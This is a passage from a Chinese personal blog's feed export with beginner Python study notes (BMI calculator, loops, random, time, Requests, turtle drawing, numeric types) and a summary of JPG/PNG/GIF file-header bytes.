class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python">heiifght,weight = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入身高（米）和体重（公斤）[用逗号隔开]：&quot;</span>))<br>bmi = weight/<span class="hljs-built_in">pow</span>(height,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;BMI数值为：&#123;:.2f&#125;&quot;</span>.<span class="hljs-built_in">format</span>(bmi))<br><span class="hljs-keyword">if</span> bmi &lt; <span class="hljs-number">18.5</span>:<br>who = <span class="hljs-string">&quot;偏廋&quot;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-number">18.5</span> &lt;= bmi &lt; <span class="hljs-number">25</span>:<br>who = <span class="hljs-string">&quot;正常&quot;</span><br><span class="hljs-keyword">elif</span> <span class="hljs-number">25</span> &lt;= bmi &lt; <span class="hljs-number">30</span>:<br>who = <span class="hljs-string">&quot;偏胖&quot;</span><br><span class="hljs-keyword">else</span>:<br>who = <span class="hljs-string">&quot;肥胖&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;BMI指标为:国际&#x27;&#123;0&#125;&#x27;&quot;</span>.<span class="hljs-built_in">format</span>(who))<br></code></pre></td></tr></table></figure><h2 id="程序的循环结构"><a href="#程序的循环结构" class="headerlink" title="程序的循环结构"></a>程序的循环结构</h2><h3 id="循环遍历"><a href="#循环遍历" class="headerlink" title="循环遍历"></a>循环遍历</h3><p><strong>结构：</strong><br>for &lt;循环变量&gt; in &lt;遍历结构&gt;:<br>    &lt;语句块&gt;<br><strong>计数循环N次：</strong><br>for i in range(N):<br>    &lt;语句块&gt;<br><strong>字符串遍历循环：</strong><br>for c in s:<br>    &lt;语句块&gt;<br><strong>列表遍历循环：</strong><br>for item in ls:<br>    &lt;语句块&gt;</p><ul><li>ls是一个列表，遍历其每个元素，产生循环</li></ul><h3 id="无限循环（条件循环）"><a href="#无限循环（条件循环）" class="headerlink" title="无限循环（条件循环）"></a>无限循环（条件循环）</h3><p>while &lt;条件&gt;:<br>    &lt;语句块&gt;</p><h3 id="循环控制保留字"><a href="#循环控制保留字" class="headerlink" title="循环控制保留字"></a>循环控制保留字</h3><ul><li>break: 跳出并结束整个循环</li><li>continue: 跳出此次循环</li></ul><h2 id="random库的使用"><a href="#random库的使用" class="headerlink" title="random库的使用"></a>random库的使用</h2><p>random库是使用随机数的Python标准库。<br>使用 import random</p><ul><li>基本随机数函数： seed(),random().</li><li>扩展随机数函数： randint(), getrandbits(), uniform(), randrange(), choice(), shuffle()</li></ul><h3 id="基本随机数函数"><a href="#基本随机数函数" class="headerlink" title="基本随机数函数"></a>基本随机数函数</h3><p>给出种子：<br>random.seed(10)<br>random.random()  产生随机数<br>需要复现随机数就需要使用种子。</p><h3 id="扩展随机数函数"><a href="#扩展随机数函数" class="headerlink" title="扩展随机数函数"></a>扩展随机数函数</h3><ul><li>random.randint()</li><li>random.randrange()<br><img src="/images/suiji1.png"></li><li>random.getrandbits()</li><li>random.uniform()<br><img src="/images/suiji2.png"></li><li>random.choice()</li><li>random.shuffle()<br><img src="/images/suiji3.png"></li></ul><h2 id="实例：圆周率计算"><a href="#实例：圆周率计算" class="headerlink" title="实例：圆周率计算"></a>实例：圆周率计算</h2><p>蒙特卡洛方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> perf_counter<br>DARTS = <span class="hljs-number">1000</span>*<span class="hljs-number">1000</span><br>hits = <span class="hljs-number">0</span><br>start = perf_counter()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,DARTS+<span class="hljs-number">1</span>):<br>x,y = random(),random()<br>dist = <span class="hljs-built_in">pow</span>(x**<span class="hljs-number">2</span>+y**<span class="hljs-number">2</span>,<span class="hljs-number">0.5</span>)<br><span class="hljs-keyword">if</span> dist &lt;= <span class="hljs-number">1.0</span>:<br>hits = hits + <span class="hljs-number">1</span><br>pi = <span class="hljs-number">4</span>*(hits/DARTS)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;圆周率的值是：&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(pi))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python基础学习 基本数据类型（二）</title>
    <link href="/blog/2018/08/04/Python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/blog/2018/08/04/Python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>今天继续学习一下python的基本数据类型。</strong><br><img src="/images/fj3.jpg"></p><span id="more"></span><h2 id="字符串类型及操作"><a href="#字符串类型及操作" class="headerlink" title="字符串类型及操作"></a>字符串类型及操作</h2><h3 id="字符串的表示"><a href="#字符串的表示" class="headerlink" title="字符串的表示"></a>字符串的表示</h3><ul><li>由一对单引号或双引号表示，仅表示单行字符串，例如：<br>“string” 或者 ‘string’</li><li>由一对三单引号或三双引号表示，可表示多行字符串，例如：<br>‘’’string1<br> string2’’’<br>或者<br>“””string1<br> string2”””</li><li>使用[]获取字符串中一个或多个字符<br>1.索引： string[-1]<br>2.切片： string[M:N]<br>切片高级操作： string[M:N:K],K表示步长。字符串逆序可以这样操作：[::-1]。</li><li>转义符\：表达特定字符的本意</li></ul><h3 id="字符串操作符"><a href="#字符串操作符" class="headerlink" title="字符串操作符"></a>字符串操作符</h3><p><img src="/images/czf.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">weekStr = <span class="hljs-string">&quot;一二三四五六日&quot;</span><br>weekId = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入星期数字(1-7):&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;星期&quot;</span> + weekStr[weekId-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h3 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h3><ul><li>len(x) :返回字符串X的长度</li><li>str(x) :返回任意类型x对应的字符串形式，与eval函数作用是相对的</li><li>hex(x)或oct(x) :整数x的十六进制或八进制小写形式字符串</li><li>chr(u) :u为Unicode编码，返回其对应的字符</li><li>ord(x) :x为字符，返回其对应的Unicode编码</li></ul><h3 id="字符串的处理方法"><a href="#字符串的处理方法" class="headerlink" title="字符串的处理方法"></a>字符串的处理方法</h3><p><strong>“方法”：特指<a>.<b>()风格中的函数<b>()</strong><br>八个字符串常用处理方法:<br><img src="/images/fangfa1.png"></p><ul><li>str.replace(old,new):返回字符串str的副本，所有old字串被替换成new</li><li>str.center(width,[fillchar]):字符串str根据宽度width居中，fillchar可选，是填充字符</li></ul><p><img src="/images/fangfa2.png"></p><h3 id="字符串类型格式化"><a href="#字符串类型格式化" class="headerlink" title="字符串类型格式化"></a>字符串类型格式化</h3><p>槽：例如：”{}:计算机{}的CPU占用率为{}%”.format(“2018-8-4”,”A”,10)”     其中大括号包含的即为槽。<br>槽的内部格式化：<br><img src="/images/caogeshihua.png"></p><h2 id="time库的使用"><a href="#time库的使用" class="headerlink" title="time库的使用"></a>time库的使用</h2><h3 id="time库介绍"><a href="#time库介绍" class="headerlink" title="time库介绍"></a>time库介绍</h3><p>time库是Python中处理时间的标准库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> time<br>time.&lt;b&gt;()<br></code></pre></td></tr></table></figure><p>time库包括三类函数：</p><ul><li>时间获取：time() ctime() gmtime()</li><li>时间格式化： strftime() strptime()</li><li>程序计时：sleep()  perf_counter()</li></ul><h3 id="时间获取"><a href="#时间获取" class="headerlink" title="时间获取"></a>时间获取</h3><p>time.time()获取当前时间戳，浮点数<br>time.ctime()获取当前时间，人类易读<br>time.gmtime()获得一个结构体计算机可以利用的时间格式</p><h3 id="时间格式化"><a href="#时间格式化" class="headerlink" title="时间格式化"></a>时间格式化</h3><p><strong>strftime()：</strong><br><img src="/images/time1.png"><br><strong>strptime()：</strong><br><img src="/images/time2.png"></p><h3 id="计时应用"><a href="#计时应用" class="headerlink" title="计时应用"></a>计时应用</h3><p><strong>perf_counter()：</strong><br><img src="/images/time3.png"><br><strong>sleep函数和C语言一致</strong></p><h2 id="实例：文本进度条"><a href="#实例：文本进度条" class="headerlink" title="实例：文本进度条"></a>实例：文本进度条</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> time<br>scale = <span class="hljs-number">10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------start-------&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(scale+<span class="hljs-number">1</span>):<br>a = <span class="hljs-string">&#x27;*&#x27;</span> * i<br>b = <span class="hljs-string">&#x27;.&#x27;</span> * (scale - i)<br>c = (i/scale)*<span class="hljs-number">100</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;:^3.0f&#125;%[&#123;&#125;-&gt;&#123;&#125;]&quot;</span>.<span class="hljs-built_in">format</span>(c,a,b))<br>time.sleep(<span class="hljs-number">0.1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------end--------&quot;</span>)<br></code></pre></td></tr></table></figure><p>执行结果：<br><img src="/images/jindutiao.png"></p><p><strong>单行动态刷新：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\r&#123;:3&#125;%&quot;</span>.<span class="hljs-built_in">format</span>(i),end<span class="hljs-string">&quot;&quot;</span>)<br>time.sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><p><strong>文本进度条完整效果</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> time<br>scale = <span class="hljs-number">10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start&quot;</span>.center(scale//<span class="hljs-number">2</span>,<span class="hljs-string">&quot;-&quot;</span>))<br>start = time.perf_counter()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(scale+<span class="hljs-number">1</span>):<br>a = <span class="hljs-string">&#x27;*&#x27;</span> * i<br>b = <span class="hljs-string">&#x27;.&#x27;</span> * (scale - i)<br>c = (i/scale)*<span class="hljs-number">100</span><br>dur = time.perf_counter() - start<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\r&#123;:^3.0f&#125;%[&#123;&#125;-&gt;&#123;&#125;]&#123;:.2f&#125;s&quot;</span>.<span class="hljs-built_in">format</span>(c,a,b,dur),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>time.sleep(<span class="hljs-number">0.1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;end&quot;</span>.center(scale//<span class="hljs-number">2</span>,<span class="hljs-string">&quot;-&quot;</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python中Requests库的基本使用</title>
    <link href="/blog/2018/08/03/Python%E4%B8%ADRequests%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/blog/2018/08/03/Python%E4%B8%ADRequests%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>python爬虫从入门到放弃</strong><br><img src="/images/fj2.jpg"></p><span id="more"></span><h2 id="什么是Requests库"><a href="#什么是Requests库" class="headerlink" title="什么是Requests库"></a>什么是Requests库</h2><ul><li>Requests是用python语言基于urllib编写的，采用的是Apache2 Licensed开源协议的HTTP库</li><li>其实urllib还是非常不方便的，而Requests它会比urllib更加方便，可以节约我们大量的工作。（用了requests之后，你基本都不愿意用urllib了）一句话，requests是python实现的最简单易用的HTTP库，建议爬虫使用requests库。</li><li>默认安装好python之后，是没有安装requests模块的，需要单独通过pip安装</li></ul><h2 id="Requests功能"><a href="#Requests功能" class="headerlink" title="Requests功能"></a>Requests功能</h2><h3 id="1-总体功能"><a href="#1-总体功能" class="headerlink" title="1.总体功能"></a>1.总体功能</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br>response  = requests.get(<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(response))<br><span class="hljs-built_in">print</span>(response.status_code)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(response.text))<br><span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-built_in">print</span>(response.cookies)<br><span class="hljs-built_in">print</span>(response.content)<br><span class="hljs-built_in">print</span>(response.content.decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br></code></pre></td></tr></table></figure><p><strong>response使用起来确实非常方便，这里有个问题需要注意一下：</strong></p><ul><li>很多情况下的网站如果直接response.text会出现乱码的问题，所以这个使用response.content，这样返回的数据格式其实是二进制格式，然后通过decode()转换为utf-8，这样就解决了通过response.text直接返回显示乱码的问题。</li><li>请求发出后，Requests 会基于 HTTP 头部对响应的编码作出有根据的推测。当你访问 response.text 之时，Requests 会使用其推测的文本编码。你可以找出 Requests 使用了什么编码，并且能够使用response.encoding 属性来改变它.如：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">response =requests.get(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>)<br>response.encoding=<span class="hljs-string">&quot;utf-8&quot;</span><br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>不管是通过**response.content.decode(“utf-8”)<strong>的方式还是通过</strong>response.encoding&#x3D;”utf-8”**的方式都可以避免乱码的问题发生。</li></ul><h3 id="2-各种请求方式"><a href="#2-各种请求方式" class="headerlink" title="2.各种请求方式"></a>2.各种请求方式</h3><ul><li>基本GET请求<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br>response = requests.get(<span class="hljs-string">&#x27;https://doubler.cn/get&#x27;</span>)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure></li><li>含参数的GET请求<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br>response = requests.get(<span class="hljs-string">&quot;https://doubler.cn/get?name=zhujialei&amp;age=20&quot;</span>)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure></li><li>解析json<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br>response = requests.get(<span class="hljs-string">&quot;http://httpbin.org/get&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(response.text))<br><span class="hljs-built_in">print</span>(response.json())<br><span class="hljs-built_in">print</span>(json.loads(response.text))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(response.json()))<br></code></pre></td></tr></table></figure></li><li>添加headers<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br>headers = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span><br>&#125;<br>response =requests.get(<span class="hljs-string">&quot;https://www.zhihu.com&quot;</span>,headers=headers)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure></li><li>基本POST请求<br>通过在发送post请求时添加一个data参数，这个data参数可以通过字典构造成，这样对于发送post请求就非常方便:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br>data = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhujialei&quot;</span>,<br>    <span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">20</span><br>&#125;<br>response = requests.post(<span class="hljs-string">&quot;https://doubler.cn/post&quot;</span>,data=data)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python基础学习 基本数据类型</title>
    <link href="/blog/2018/08/03/Python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <url>/blog/2018/08/03/Python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p><strong>今天继续学习一下python，了解一下python的基本数据类型。</strong><br><img src="/images/fengjing1.jpg"></p><span id="more"></span><h2 id="数字类型及操作"><a href="#数字类型及操作" class="headerlink" title="数字类型及操作"></a>数字类型及操作</h2><h3 id="1-整数类型"><a href="#1-整数类型" class="headerlink" title="1.整数类型"></a>1.整数类型</h3><ul><li>Python中的整数类型与数学中整数概念一致，可正可负，没有取值范围的限制。下面介绍一下**pow(x,y)**函数：同C语言一致，计算x的y次方，想算多大就算多大。</li><li>四种进制表示：十进制；二进制：以0b开头；八进制：以0o开头；十六进制：以0x开头。</li></ul><h3 id="2-浮点类型"><a href="#2-浮点类型" class="headerlink" title="2.浮点类型"></a>2.浮点类型</h3><ul><li>Python中的浮点类型与数学中实数概念一致，是指带有小数点及小数的数字，它的取值范围和小数精度都存在限制，但是常规计算可以忽略。浮点数间运算存在不确定尾数，这并不是bug。</li><li>由于浮点数间运算存在不确定尾数（不确定尾数通常出现在10的-16次方），可用<strong>round(x,d)</strong>:对x四舍五入，d是小数截取位数。</li><li>科学记数法：<a>e<b> 表示a乘以10的b次方。</li></ul><h3 id="3-复数类型"><a href="#3-复数类型" class="headerlink" title="3.复数类型"></a>3.复数类型</h3><ul><li>实例：z&#x3D;1.23e-4+5.6e+89j<br>实部： z.real<br>虚部： z.imag<br>常规计算很少使用，但到了复变函数那里会经常使用。</li></ul><h3 id="4-数值运算操作符"><a href="#4-数值运算操作符" class="headerlink" title="4.数值运算操作符"></a>4.数值运算操作符</h3><ul><li>x%y：取余运算</li><li>x**y：x的y次方</li><li>如下图：<br><img src="/images/yunsuanfu.png"></li><li>二元操作符：<br><img src="/images/eryuancaozuofu.png"></li></ul><h3 id="5-数值运算函数"><a href="#5-数值运算函数" class="headerlink" title="5.数值运算函数"></a>5.数值运算函数</h3><ul><li>绝对值，商余，幂余：<br><img src="/images/szys.png"></li><li>类型转换<br><img src="/images/lxzh.png"></li></ul><h2 id="实例：天天向上的力量"><a href="#实例：天天向上的力量" class="headerlink" title="实例：天天向上的力量"></a>实例：天天向上的力量</h2><h3 id="持续的价值"><a href="#持续的价值" class="headerlink" title="持续的价值"></a>持续的价值</h3><ul><li>一年365天，每天进步1%，累计可以进步多少呢？<br>pow(1.01,365)&#x3D;37.78343433288728;</li><li>一年365天，每天退步1%，累计可以剩下多少呢？<br>pow(0.99,365)&#x3D;0.025517964452291125；</li></ul><p><strong>每天努力一点点，一年之后将会有很大的不同！相反，每天退步一点点，一年之后便所剩无几。</strong></p><h3 id="利用Python代码实现计算工作日努力参数"><a href="#利用Python代码实现计算工作日努力参数" class="headerlink" title="利用Python代码实现计算工作日努力参数"></a>利用Python代码实现计算工作日努力参数</h3><p><code>Python def dayUp(df):     dayup = 1     for i in range(365):         if i % 7 in [6,0]:             dayup=dayup*(1-0.01)         else:             dayup=dayup*(1+df)     return dayup dayfactor = 0.01 while dayUp(dayfactor) &lt; 37.78:     dayfactor += 0.001 print(&quot;工作日的努力参数是:&#123;:.3f&#125;&quot;.format(dayfactor))</code></p><p>最后得出工作日的努力参数是:0.019（相比于每天多努力0.01的人来说）</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>认识了一下python的基础数据类型</li><li>意识到了每天进步一点点的重要性</li><li>以后坚持每天进步一点点</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python绘图</title>
    <link href="/blog/2018/08/01/python%E7%BB%98%E5%9B%BE/"/>
    <url>/blog/2018/08/01/python%E7%BB%98%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<p><strong>今天看mooc上面的python教程，老师讲了一个有趣的实例，记录一下，挺好玩</strong><br><img src="/images/py.jpg"></p><span id="more"></span><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p><strong>安装所需要的turtle库</strong></p><pre><code class="hljs">pip install turtle</code></pre><h2 id="开始编写"><a href="#开始编写" class="headerlink" title="开始编写"></a>开始编写</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> turtle<br>turtle.setup(<span class="hljs-number">650</span>,<span class="hljs-number">350</span>,<span class="hljs-number">200</span>,<span class="hljs-number">200</span>)<br>turtle.penup()<br>turtle.fd(-<span class="hljs-number">250</span>)<br>turtle.pendown()<br>turtle.pensize(<span class="hljs-number">25</span>)<br>turtle.pencolor(<span class="hljs-string">&quot;yellow&quot;</span>)<br>turtle.seth(-<span class="hljs-number">40</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    turtle.circle(<span class="hljs-number">40</span>,<span class="hljs-number">80</span>)<br>    turtle.circle(-<span class="hljs-number">40</span>,<span class="hljs-number">80</span>)<br>turtle.circle(<span class="hljs-number">40</span>,<span class="hljs-number">80</span>/<span class="hljs-number">2</span>)<br>turtle.fd(<span class="hljs-number">40</span>)<br>turtle.circle(<span class="hljs-number">16</span>,<span class="hljs-number">180</span>)<br>turtle.fd(<span class="hljs-number">40</span>*<span class="hljs-number">2</span>/<span class="hljs-number">3</span>)<br>turtle.done()<br></code></pre></td></tr></table></figure><p><strong>保存并执行，便会画出一条蛇，还是动态的过程呢。以后还可以画朵玫瑰送给女朋友（虽然还没有哈哈哈），挺不错的呢~</strong><br><img src="/images/PythonDraw.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见图片格式分析总结</title>
    <link href="/blog/2018/07/31/%E5%B8%B8%E8%A7%81%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/"/>
    <url>/blog/2018/07/31/%E5%B8%B8%E8%A7%81%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p><strong>总结一下常见的图片格式的十六进制的开头结尾以及含义（可用winhex十六进制编辑器打开图片编辑）</strong><br><img src="/images/4.jpg"></p><span id="more"></span><h2 id="1、JPG文件格式："><a href="#1、JPG文件格式：" class="headerlink" title="1、JPG文件格式："></a>1、JPG文件格式：</h2><p>（1）JPG &#x3D; “段” + 经过压缩编码的图像数据<br>什么是‘段’？段是一种数据结构，主要是来控制一段数据怎样存储和表示，段的结构如下：<br>段  &#x3D;  段标识  +  段类型  +  段长度  +段内容          （其中文件头和文件尾属于没有‘段长度’和‘段内容’的特殊的段）<br>（2）‘段标识’是一种固定的符号–“FF”，段的类型有30种，其中有10中是每个JPG图片中必须存在的，其余的都是可选的类型，在此，我们就那10中类型加以说明，如下：</p><p>【1】D8 —- 文件头   【2】D9 — 文件尾  【3】FE— 注释  【4】C0— 帧开始  【5】C1 — 帧开始<br>【6】C4 — 定义Huffman表  【7】DA — 扫描行开始  【8】DB — 定义量化表 【9】DD—定义重新开始间隔<br>【10】E0 — 定义交换格式和图像识别信息</p><p>因此，一般的JPG格式的图片通过十六进制的文件磁盘内容查看器发现：文件头为：FF D8  ，而且通常在此之后都有FF E0（其后一般接JFIF）来表明图像识别信息和交换格式，文件尾为：FF D9。</p><h2 id="2、PNG文件格式："><a href="#2、PNG文件格式：" class="headerlink" title="2、PNG文件格式："></a>2、PNG文件格式：</h2><p>（1）文件结构如下：<br>PNG文件 &#x3D;  PNG标识  +  数据块   + 数据块  + ……  + 数据块（其中数据块的个数最少是4）<br>（2）PNG标识是固定的，以十六进制表示为：【89  50  4E  47  0D  0A  1A  0A】，对应的符号为：【 ‰  P  N  G  .  .  .  . 】</p><p>数据块分析如下：</p><p>PNG文件 -  PNG标识  &#x3D;   IHDR  + 可选数据块  +  PLTE  +  可选数据块  +  IDAT  +  可选数据块  +  IEND<br>分别说明如下：</p><p>【1】IHDR数据块，文件头数据块，在一个PNG文件里只能有一个。<br>【2】PLTE数据块，调色板数据块，它仅与索引彩色图像有关，其中，‘索引图像’是指–一种把像素值直接作为RGB调色板下标的图像。<br>【3】IDAT数据块，图像数据块，存储实际的图像数据，在数据流中包含多个连续顺序的图像数据块。<br>【4】IEND数据块，图像结束数据块，表示–数据流已结束，放在文件的末尾。<br>以上的数据块都是以自己的名字作为开头来控制一段数据。其中，结尾数据块IEND的内容固定：<br>【00  00  00  00  49  45  4E  44  AE  42  60  82】，对应的符号如下：<br>【.   .    .    .   I   E   N   D  （后四位为CRC校验码）】</p><h2 id="3、GIF文件格式："><a href="#3、GIF文件格式：" class="headerlink" title="3、GIF文件格式："></a>3、GIF文件格式：</h2><p>（1）文件的单位是数据块，文件的结构如下：<br>GIF文件  &#x3D;  文件头  +  GIF数据流  +  文件结束块<br>GIF数据流  &#x3D;  控制块  +   成像块   +  特殊用途块<br>（2）文件头大小为6个字节，而且【文件头  &#x3D;  标识符（3字节） +  版本（3字节）】，其中，标识符为“GIF”，版本一般是“87a”或者“89a”。<br>文件结束块是一个单字节的数据块，它指示数据流的结束，值为“0x3B”，符号是“；”。<br>注意：GIF文件中的每个数据块都有一个块尾记录，大小为1个字节，同样也是“0x3B”。</p><h2 id="4、BMP文件格式："><a 